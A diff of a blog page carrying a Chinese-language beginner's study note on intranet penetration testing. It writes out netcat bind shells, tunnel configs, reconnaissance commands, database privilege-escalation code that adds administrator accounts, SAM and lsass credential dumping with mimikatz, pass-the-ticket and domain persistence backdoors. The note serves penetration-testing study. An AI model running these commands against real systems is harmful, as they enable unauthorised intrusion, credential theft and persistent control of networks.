@@ -1,83 +1,473 @@
 <!DOCTYPE html>
-<html>
-    <head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
-    <title>J47erry&#39;S BLOG | 杰歪</title>
-    
-<link rel="stylesheet" href="/css/reset.css">
-
+<html lang="zh-CN">
+<head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            J47erry&#39;S BLOG
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png"/>
     
 <link rel="stylesheet" href="/css/style.css">
 
     
-<link rel="stylesheet" href="/css/markdown.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css">
 
     
-<link rel="stylesheet" href="/css/fonts.css">
+<link rel="stylesheet" href="/css/gitment.css">
 
+    
+<link rel="stylesheet" href="/css/hljs.min.css">
+
+    
+<script src="/js/hljs.min.js"></script>
+  
+    
+<script src="/js/gitment.browser.js"></script>
+  
 <meta name="generator" content="Hexo 6.2.0"></head>
-    <body>
-        <div class="paper">
-            <div class="paper-main">
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            J47erry&#39;S BLOG
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
                 
-                    <div class="header">
-    <a class="logo" href="/">J47erry&#39;S BLOG</a>
-    <ul class="nav">
-        
-        <li><a href="/">首页</a></li>
-        
-        <li><a href="/archives">归档</a></li>
-        
-        <li><a href="/about">关于</a></li>
-        
-    </ul>
-</div>
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
                 
-                <div class="post-list">
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a target="_blank" rel="noopener" href="https://github.com/vevlins/" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)"></input>
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <section class="posts">
     
-    <div class="post">
-        <a class="post-title" href="/2022/05/22/%E6%B5%85%E8%B0%88-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"># 浅谈|内网渗透</a>
-        <div class="post-except">
-            文章的内容比较全面，但是整体的内容没有深入和专精的点。仅供小白操作。
-0x00 前言接触安全数月有余，整理一下内网学习笔记，但依旧是小白，很多知识技能尚未覆盖。如有疏漏之处，还请师傅们斧正。
-0x01 内网穿透#nc内网穿透&#x2F;&#x2F;攻击机执行
-nc -lvp 3333
-
-&#x2F;&#x2F;目标机执行
-nc -lvp 3333 -e c:\windows\system32\cmd.exe
-
-&#x2F;&#x2F;中间机执行  
- nc -v 攻击机ip 
-            <a class="read-more" href="/2022/05/22/%E6%B5%85%E8%B0%88-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"> ... </a>
-        </div>
-        <div class="post-date">2022.05.22</div>
-    </div>
-    
-</div>
-
-                <div class="footer">
-    <span>Copyright © 2022 J47erry&#39;S BLOG</span>
-    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這Li</a></span>
-</div>
-
-
-<link rel="stylesheet" href="/css/a11y-dark.min.css">
-
-
-<script src="/js/highlight.min.js"></script>
-
-
-<script src="/js/highlightjs-line-numbers.js"></script>
-
-
-<script>
-    hljs.initHighlightingOnLoad();
-    hljs.initLineNumbersOnLoad();
-</script>
-
+        <article class="post">
+            <h1>
+                <a class="title" href="/2022/05/22/%E6%B5%85%E8%B0%88-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"> 
+                    # 浅谈|内网渗透 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2022-05-22   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
             </div>
-        </div>
-    </body>
+            <div class="content">
+                
+                <p>文章的内容比较全面，但是整体的内容没有深入和专精的点。仅供小白操作。</p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>接触安全数月有余，整理一下内网学习笔记，但依旧是小白，很多知识技能尚未覆盖。如有疏漏之处，还请师傅们斧正。</p>
+<h2 id="0x01-内网穿透"><a href="#0x01-内网穿透" class="headerlink" title="0x01 内网穿透"></a>0x01 内网穿透</h2><h4 id="nc内网穿透"><a href="#nc内网穿透" class="headerlink" title="#nc内网穿透"></a>#nc内网穿透</h4><p>&#x2F;&#x2F;攻击机执行</p>
+<pre><code>nc -lvp 3333
+</code></pre>
+<p>&#x2F;&#x2F;目标机执行</p>
+<pre><code>nc -lvp 3333 -e c:\windows\system32\cmd.exe
+</code></pre>
+<p>&#x2F;&#x2F;中间机执行  </p>
+<pre><code> nc -v 攻击机ip 3333 -e “nc -v 目标机ip 3333”
+</code></pre>
+<h4 id="frp内网穿透配置"><a href="#frp内网穿透配置" class="headerlink" title="#frp内网穿透配置"></a>#frp内网穿透配置</h4><p>&#x2F;&#x2F;内网机器上安装frpc，并修改 frpc.ini：</p>
+<pre><code>[common]
+server_addr = 101.120.252.139
+server_port = 12345
+token = setyourowntoken
+tcp_mux = true
+
+[web]
+type = tcp
+local_ip = 192.168.1.10
+local_port = 8080
+remote_port = 8080
+</code></pre>
+<p>&#x2F;&#x2F;外网服务器上安装frps。 并修改 frps.ini：</p>
+<pre><code>[common]
+bind_port = 12345
+log_file = ./frps.log
+# debug, info, warn, error
+log_level = info
+log_max_days = 3
+# auth token
+token = setyourowntoken
+max_pool_count = 50
+tcp_mux = true
+subdomain_host = some.domain.com
+</code></pre>
+<h4 id="花生壳内网穿透"><a href="#花生壳内网穿透" class="headerlink" title="#花生壳内网穿透"></a>#花生壳内网穿透</h4><p>官网参考：<a href="https://link.zhihu.com/?target=https://hsk.oray.com/">https://hsk.oray.com/</a></p>
+<h4 id="Cloudflare-argo-tunnel"><a href="#Cloudflare-argo-tunnel" class="headerlink" title="# Cloudflare argo tunnel"></a># Cloudflare argo tunnel</h4><p>官网参考： <a href="https://link.zhihu.com/?target=https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup">https://developers.cloudflare.com</a></p>
+<h2 id="0x02-内网信息收集"><a href="#0x02-内网信息收集" class="headerlink" title="0x02 内网信息收集"></a>0x02 内网信息收集</h2><p>内网渗透测试核心就是信息收集。对测试目标的了解越多，测试越容易进行。</p>
+<h3 id="2-1当前主机信息收集"><a href="#2-1当前主机信息收集" class="headerlink" title="2.1当前主机信息收集"></a>2.1当前主机信息收集</h3><p>在主机上信息收集主要包括<strong>操作系统、权限、内网ip地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话</strong>等。</p>
+<p>&#x2F;&#x2F;用户列表</p>
+<pre><code>net user          #分析本机用户列表
+</code></pre>
+<p>&#x2F;&#x2F;本机服务</p>
+<pre><code>wmic service list brief
+</code></pre>
+<p>&#x2F;&#x2F;进程列表</p>
+<pre><code>tasklist /svc    //主要分析软件、邮件客户端、VPN和杀毒软件等进程
+</code></pre>
+<p>&#x2F;&#x2F;会话显示</p>
+<pre><code>net session
+</code></pre>
+<p>&#x2F;&#x2F;端口列表</p>
+<pre><code>netstat -ano     //查看端口列表、本机开放的端口所对应的服务和应用程序
+</code></pre>
+<p>&#x2F;&#x2F;补丁列表</p>
+<pre><code>wmic qfe get Caption.Description,HotFixID,InstalledOn  
+//会显示补丁的名称、描述、ID、安装时间等信息（也可以通过systeminfo看补丁信息）
+</code></pre>
+<p>&#x2F;&#x2F;共享列表</p>
+<pre><code>net share
+</code></pre>
+<p>&#x2F;&#x2F;软件安装信息</p>
+<pre><code>wmic product get name,version       //分析杀毒软件
+</code></pre>
+<p>&#x2F;&#x2F;还原防火墙墙</p>
+<pre><code>netsh advfirewall reset
+</code></pre>
+<h3 id="2-2域内存活主机探测"><a href="#2-2域内存活主机探测" class="headerlink" title="2.2域内存活主机探测"></a>2.2域内存活主机探测</h3><h4 id="NetBIOS协议快速探测内网"><a href="#NetBIOS协议快速探测内网" class="headerlink" title="#NetBIOS协议快速探测内网"></a><strong>#NetBIOS协议快速探测内网</strong></h4><pre><code>nbt.exe 192.168.1.0/20
+</code></pre>
+<p>Token含义：</p>
+<pre><code>SHARING       存在正在运行的文件和打印共享服务，但不一定有内容共享
+DC            可能是域控制器
+U=USER        登录名为User的用户（可能会存在误报）
+IIS           可能安装IIS服务器
+EXCHANGE      可能安装了Exchange
+NOTES         可能安装了Lotus Notes电子邮件客户端
+?             没有识别出NetBIOS资源
+</code></pre>
+<h4 id="ICMP协议快速探测内网"><a href="#ICMP协议快速探测内网" class="headerlink" title="#ICMP协议快速探测内网"></a>#ICMP协议快速探测内网</h4><pre><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;
+//该命令表示循环ping探测整个c段
+</code></pre>
+<h4 id="ARP扫描探测内网"><a href="#ARP扫描探测内网" class="headerlink" title="#ARP扫描探测内网"></a>#ARP扫描探测内网</h4><p>1.直接上传arp.exe</p>
+<pre><code>arp.exe -t 192.168.1.0/20
+</code></pre>
+<p>2.Empire使用arpscan模块</p>
+<pre><code>usemodule situational_awareness/network/arpscan
+</code></pre>
+<p>3.Nishang使用Invoke-ARPScan.ps1脚本<br>将脚本上传到目标主机中运行（也可以输入命令远程加载脚本）</p>
+<h4 id="TCP-x2F-UDP端口探测内网"><a href="#TCP-x2F-UDP端口探测内网" class="headerlink" title="#TCP&#x2F;UDP端口探测内网"></a>#TCP&#x2F;UDP端口探测内网</h4><p>ScanLine中TCP&#x2F;UDP端口扫描</p>
+<pre><code>scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.1.1-254 /b
+</code></pre>
+<p>tips：可以在<strong>白天和晚上</strong>分别进行探测，进而对比存活主机和对应的ip地址。</p>
+<h3 id="2-3端口扫描"><a href="#2-3端口扫描" class="headerlink" title="2.3端口扫描"></a>2.3端口扫描</h3><h4 id="telnet命令进行扫描"><a href="#telnet命令进行扫描" class="headerlink" title="#telnet命令进行扫描"></a>#telnet命令进行扫描</h4><pre><code>telnet DC [端口号]
+//适用于探测某个常规高危端口是否开放
+</code></pre>
+<h4 id="Metasploit端口扫描"><a href="#Metasploit端口扫描" class="headerlink" title="#Metasploit端口扫描"></a>#Metasploit端口扫描</h4><pre><code>use auxiliary/scanner/portscan/tcp
+</code></pre>
+<p>提供多种端口扫描技术，可以通过下面的命令进行搜索</p>
+<pre><code>search portscan  
+</code></pre>
+<h4 id="Nishang模块进行扫描"><a href="#Nishang模块进行扫描" class="headerlink" title="#Nishang模块进行扫描"></a>#Nishang模块进行扫描</h4><p>Invoke-PortScan是Nishang的端口扫描模块，可以发现主机，解析主机名，扫描端口。</p>
+<pre><code>Invoke-PortScan -StartAddress 192.168.250.1 -EndAddress 192.168.250.255 -ResolveHost
+</code></pre>
+<h2 id="0x03-权限提升"><a href="#0x03-权限提升" class="headerlink" title="0x03 权限提升"></a>0x03 权限提升</h2><p><strong>最高权限：</strong></p>
+<ul>
+<li><strong>Windows：system（TrustedInstaller不常用）</strong></li>
+<li><strong>Linux：root</strong></li>
+</ul>
+<h3 id="Windows（只提3种）"><a href="#Windows（只提3种）" class="headerlink" title="Windows（只提3种）:"></a><strong>Windows（只提3种）:</strong></h3><h4 id="系统内核溢出"><a href="#系统内核溢出" class="headerlink" title="#系统内核溢出"></a>#系统内核溢出</h4><p>&#x2F;&#x2F;确定补丁的个数和种类 寻找提权exp编号</p>
+<pre><code>systeminfo 
+</code></pre>
+<p>&#x2F;&#x2F;查看端口和进程和服务 查询杀软防护 寻找exp</p>
+<pre><code>tasklist /svc
+</code></pre>
+<p>&#x2F;&#x2F;利用Metasploit的模块发现缺失补丁 </p>
+<pre><code>use post/windows/gather/enum_patches
+</code></pre>
+<h4 id="数据库提权"><a href="#数据库提权" class="headerlink" title="#数据库提权"></a>#数据库提权</h4><p><strong>mysql</strong>（利用udf提权）</p>
+<ul>
+<li><p>只有在root权限下</p>
+</li>
+<li><p>上传udf.dll文件（如果mysql版本&gt;5.1.就要将udf.dll文件放入mysql&#x2F;lib&#x2F;plugin（可以自己创建文件夹），如果版本&lt;5.1，就要将文件放入c盘Windows下面） </p>
+<p>&#x2F;&#x2F;通过密码连接数据库</p>
+<p>（翻数据库文件，连接密码一般存在于inc&#x2F;config里面）</p>
+<p>&#x2F;&#x2F;创建数据表连接数据库以后操作</p>
+<pre><code class="sql">create table udfeval（shellcode longblob）
+</code></pre>
+<p>&#x2F;&#x2F;将udf文件放入数据库中</p>
+<pre><code class="sql">insert into udfeval values （load_file（&quot;udf路径&quot;））
+</code></pre>
+<p>&#x2F;&#x2F;把创建表的信息导出</p>
+<pre><code class="sql">select shellload from udfeval into dumpfile “c://windows/udf.dll”
+</code></pre>
+<p>&#x2F;&#x2F;创建func函数</p>
+<pre><code class="sql">create function cmdshell return string soname ‘udf.dll’
+</code></pre>
+<p>&#x2F;&#x2F;查找是否存在udf</p>
+<pre><code class="sql">select * from func
+</code></pre>
+<p>&#x2F;&#x2F;查询权限</p>
+<pre><code class="sql">select cmdshell（‘whoami’）
+</code></pre>
+</li>
+</ul>
+<p><strong>mssql</strong>（利用xp_cmdshell）</p>
+<ul>
+<li><p>sa权限：</p>
+<pre><code>找数据库配置文件config，查看数据库类型/权限/密码
+查看当前权限，简单systeminfo查看补丁
+补丁很多的情况下，通过密码连接数据库(sqlmap有--os-shell可以直接上线利用)
+在数据库中打开xp_cmdshell调用exeo master.dbo.xp_cmdshell &#39;whoami&#39;
+创建账号exec master.dbo.xp_cmdshell &#39;net user hack hack/add&#39;
+将账号加入管理组才能正常登录exec master.dbo.xp_cmdshell &#39;net localgroup administrator hack/add &#39;
+</code></pre>
+</li>
+<li><p>普通权限：</p>
+<p>查看服务是否存在sql server sgent服务（必须前提），输入文本代码，使回显成一个txt文件查看执行结果。</p>
+<pre><code class="sql">USE msdb
+EXEC sp_add_job @job_name = &#39;GetSystemOnSQL&#39;,
+@enabled = 1,
+@description = &#39;This will give a low privileged user access to xp_cmdshell&#39;,
+@delete_level = 1
+EXEC sp_add_jobstep @job_name = &#39;GetSystemOnSQL&#39;,
+@step_name = &#39;Exec my sql&#39;,
+@subsystem = &#39;TSQL&#39;,
+@command = &#39;exec master..xp_execresultset N&#39;&#39;select &#39;&#39;&#39;&#39;exec master..xp_cmdshell &quot;net user hack hack /add&gt; c:\inetpub\wwwroot\results.txt&quot;&#39;&#39;&#39;&#39;&#39;&#39;,N&#39;&#39;Master&#39;&#39;&#39;  
+EXEC sp_add_jobserver @job_name = &#39;GetSystemOnSQL&#39;,
+@server_name = &#39;NSF-BCF0F41&#39;    
+EXEC sp_start_job @job_name = &#39;GetSystemOnSQL&#39;
+</code></pre>
+</li>
+</ul>
+<p><strong>Oracle</strong></p>
+<ol>
+<li><p>查看配置文件</p>
+</li>
+<li><p>连接数据库，查看DBA权限select * from session_roles</p>
+</li>
+<li><p>通过文件代码创建java包，并且创建函数，进一步调用函数执行命令</p>
+<pre><code class="sql">create or replace and compile
+java source named &quot;Util&quot;
+as
+import java.io.;
+import java.lang.;
+public class Util extends Object
+&#123;
+public static int RunThis(String args)
+&#123;
+Runtime rt = Runtime.getRuntime();
+int rc = -1;
+try
+&#123;
+Process p = rt.exec(args);
+int bufSize = 4096;
+BufferedInputStream bis =
+new BufferedInputStream(p.getInputStream(), bufSize);
+int len;
+byte buffer[] = new byte[bufSize];
+// Echo back what the program spit out
+while ((len = bis.read(buffer, 0, bufSize)) != -1)
+System.out.write(buffer, 0, len);
+rc = p.waitFor();
+&#125;
+catch (Exception e)
+&#123;
+e.printStackTrace();
+rc = -1;
+&#125;
+finally
+&#123;
+return rc;
+&#125;
+&#125;
+&#125;
+/
+create or replace
+function RUN_CMD(p_cmd in varchar2) return number
+as
+language java
+name &#39;Util.RunThis(java.lang.String) return integer&#39;;
+/
+create or replace procedure RC(p_cmd in varchar2)
+as
+x number;
+begin
+x := run_cmd(p_cmd);
+end;
+/
+variable x number;
+set serveroutput on
+exec dbms_java.set_output(100000);
+grant javasyspriv to CMS
+/
+exec :x:= RUN_CMD(&#39;net user hack hacker /add&#39;);
+exec :x:= RUN_CMD(&#39;net localgroup administrators hack /add&#39;);
+</code></pre>
+</li>
+</ol>
+<h4 id="客户端软件提权"><a href="#客户端软件提权" class="headerlink" title="#客户端软件提权"></a>#客户端软件提权</h4><p>默认安装一些软件时，会给予最高权限，寻找这些软件文件夹。通过工具生成伪造的插件，重命名以替换原存在的插件。放入目录，等待程序重启即可添加账户。</p>
+<h3 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h3><p>对于Linux操作系统，一般都是靠低版本的内核寻找exp进行提权，对于一些高版本的系统基本无解。因此，Linux系统较为安全。</p>
+<h4 id="内核溢出"><a href="#内核溢出" class="headerlink" title="#内核溢出"></a>#内核溢出</h4><pre><code>uname -a
+//查看内核版本 查找exp
+</code></pre>
+<h2 id="0x04-横向渗透"><a href="#0x04-横向渗透" class="headerlink" title="0x04 横向渗透"></a>0x04 横向渗透</h2><h3 id="4-1获取散列值"><a href="#4-1获取散列值" class="headerlink" title="4.1获取散列值"></a>4.1获取散列值</h3><h4 id="通过SAM和System文件抓取密码"><a href="#通过SAM和System文件抓取密码" class="headerlink" title="#通过SAM和System文件抓取密码"></a>#通过SAM和System文件抓取密码</h4><p>导出SAM和System文件：</p>
+<pre><code>reg save hklm\sam sam.hive
+reg save hklm\system system.hive
+</code></pre>
+<p>读取SAM和System文件获取NTLM Hash：</p>
+<ul>
+<li><p>使用mimikatz</p>
+</li>
+<li><p>使用Cain</p>
+<p>…..</p>
+</li>
+</ul>
+<h4 id="使用mimikatz读取"><a href="#使用mimikatz读取" class="headerlink" title="#使用mimikatz读取"></a>#使用mimikatz读取</h4><p>除了上面读取SAM文件，还可以离线读取lsass.dmp文件：</p>
+<p>&#x2F;&#x2F;使用procdump导出lsass.dmp文件</p>
+<pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre>
+<p>&#x2F;&#x2F;读取lsass.dmp文件的密码散列值sekurlsa::minidump lsass.DMP</p>
+<pre><code>sekurlsa::logonPasswords full
+</code></pre>
+<p><u>注意：在目标机器使用mimikatz时，要考虑免杀。</u></p>
+<h4 id="使用Hashcat获取"><a href="#使用Hashcat获取" class="headerlink" title="#使用Hashcat获取"></a>#使用Hashcat获取</h4><pre><code>hashcat -a 0 -m xx &lt;hashfile&gt;&lt;zidian1&gt;&lt;zidian2&gt;
+</code></pre>
+<ul>
+<li>-a 0:以字典模式破解</li>
+<li>-m xx:指定<hashfile>内的散列值类型</hashfile></li>
+<li><hashfile>:将多个散列值存入文本，等待破解</hashfile></li>
+<li><zidian1><zidian2>：指定字典文件</zidian2></zidian1></li>
+</ul>
+<h3 id="4-2Windows远程连接"><a href="#4-2Windows远程连接" class="headerlink" title="4.2Windows远程连接"></a>4.2Windows远程连接</h3><h4 id="IPC"><a href="#IPC" class="headerlink" title="#IPC"></a>#IPC</h4><pre><code>net use \\192.168.100.190\ipc$ &#39;Aa123456@&#39; /user:administrator
+</code></pre>
+<ul>
+<li>开启了139、445端口</li>
+<li>管理员开启了默认共享</li>
+</ul>
+<h3 id="4-3哈希传递"><a href="#4-3哈希传递" class="headerlink" title="4.3哈希传递"></a>4.3哈希传递</h3><h4 id="使用NTLM-Hash"><a href="#使用NTLM-Hash" class="headerlink" title="#使用NTLM Hash"></a>#使用NTLM Hash</h4><p>在目标机器中，以管理员权限运行mimikatz。</p>
+<h4 id="使用AES-256密钥（AES-128）"><a href="#使用AES-256密钥（AES-128）" class="headerlink" title="#使用AES-256密钥（AES-128）"></a>#使用AES-256密钥（AES-128）</h4><p>使用AES密钥对远程主机进行哈希传递的前提是在本地安装kb2871997。</p>
+<h3 id="4-4票据传递"><a href="#4-4票据传递" class="headerlink" title="4.4票据传递"></a>4.4票据传递</h3><h4 id="使用mimikatz进行票据传递"><a href="#使用mimikatz进行票据传递" class="headerlink" title="#使用mimikatz进行票据传递"></a>#使用mimikatz进行票据传递</h4><p>&#x2F;&#x2F;导出内存中的票据</p>
+<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;
+</code></pre>
+<p>&#x2F;&#x2F;清除内存中票据</p>
+<pre><code>mimikatz # kerberos::parge
+</code></pre>
+<p>&#x2F;&#x2F;将高权限票据文件注入内存</p>
+<pre><code>mimikatz &quot;kerberos::ptt &quot;c:\ticket\[0;4f7cf]-2-0-60a00000-administrator@krbtgt-PENTEST.COM.kirbi&quot;
+</code></pre>
+<h4 id="使用kekeo进行票据传递"><a href="#使用kekeo进行票据传递" class="headerlink" title="#使用kekeo进行票据传递"></a>#使用kekeo进行票据传递</h4><p>kekeo需要使用域名、用户名、NTLM Hash三者配合生成票据，再将票据导入，从而直接连接远程计算机。</p>
+<h2 id="0x05-权限维持"><a href="#0x05-权限维持" class="headerlink" title="0x05 权限维持"></a>0x05 权限维持</h2><h4 id="DSRM域后门"><a href="#DSRM域后门" class="headerlink" title="#DSRM域后门"></a>#DSRM域后门</h4><p>DSRM的用途是：允许管理员在域环境中出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。</p>
+<pre><code>NTDSUTIL:打开ntdsutil
+set dsrm password:设置dsrm的密码
+reset password on server null:在当前域控制器上恢复dsrm密码
+&lt;password&gt;:修改后的密码
+</code></pre>
+<p>windows server2008（且安装了kb961320）：</p>
+<pre><code>NTDSUTIL:打开ntdsutil
+SET DSRM PASSWORD:设置dsrm密码
+SYNC FROM DOMAIN ACCOUNT domainusername:使dsrm的密码和指定域用户的密码同步
+</code></pre>
+<p><u>注意：如果域控制器的系统版本为windows server 2003，则不能使用该方法进行持久化操作。</u></p>
+<h4 id="SSP维持域控权限"><a href="#SSP维持域控权限" class="headerlink" title="#SSP维持域控权限"></a>#SSP维持域控权限</h4><p>SSP是一个dll文件，主要用来实现windows操作系统的身份认证功能。</p>
+<ol>
+<li><p>使用mimikatz将伪造的ssp注入内存（重启会失效）</p>
+<pre><code>privilege::debug
+misc::memssp
+//密码存储在日志文件C:\\windows\system32\mimilsa.log
+</code></pre>
+</li>
+<li><p>将mimikatz中的mimilib.dll放到系统的C:\Windows\System32\目录下，并将mimilib.dll添加到注册表中。</p>
+</li>
+</ol>
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>对于学习内网，个人感觉还是应该理论和实操相结合，虽然大多数技术方面学习都应是如此，但对于内网貌似更注重实操。所以，多实操，多实操，多实操。</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2022/05/22/%E6%B5%85%E8%B0%88-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+</section>
+
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    
+<script src="/js/jquery.js"></script>
+
+    
+<script src="/js/toki.js"></script>
+  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
 </html>
